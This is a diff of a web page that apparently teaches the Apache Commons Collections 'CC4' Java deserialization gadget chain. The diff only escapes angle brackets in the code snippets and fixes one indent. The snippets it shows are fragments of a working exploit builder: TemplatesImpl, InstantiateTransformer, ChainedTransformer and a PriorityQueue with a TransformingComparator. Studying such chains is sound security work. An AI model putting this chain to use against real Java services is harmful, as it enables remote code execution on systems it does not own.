@@ -37,7 +37,7 @@ layout: default
     ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
 
     // 5
-    PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
+    PriorityQueue&#60;Object&#62; queue = new PriorityQueue&#60;Object&#62;(2, new TransformingComparator(chain));
     queue.add(1);
     queue.add(1);
 
@@ -99,7 +99,7 @@ Class[] paramTypes = new Class[] { Templates.class };
 Object[] argst = new Object[] { templates };
 InstantiateTransformer instantiate = new InstantiateTransformer(paramTypes, argst);
 ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
-PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
+PriorityQueue&#60;Object&#62; queue = new PriorityQueue&#60;Object&#62;(2, new TransformingComparator(chain));
 queue.add(1);
 queue.add(1);
 </code>
@@ -152,7 +152,7 @@ That is why it doesn't matter if we pass 1 or 2 or any other string.(Keep in min
 <p>
     <pre>
 <code>
-    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import java.lang.reflect.Field;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import javassist.ClassClassPath;
@@ -224,7 +224,7 @@ public class cc4 {
 		Object[] argst = new Object[] { templates };
 		InstantiateTransformer instantiate = new InstantiateTransformer(paramTypes, argst);
         ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
-        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
+        PriorityQueue&#60;Object&#62; queue = new PriorityQueue&#60;Object&#62;(2, new TransformingComparator(chain));
 		queue.add(1);
 		queue.add(1);
         
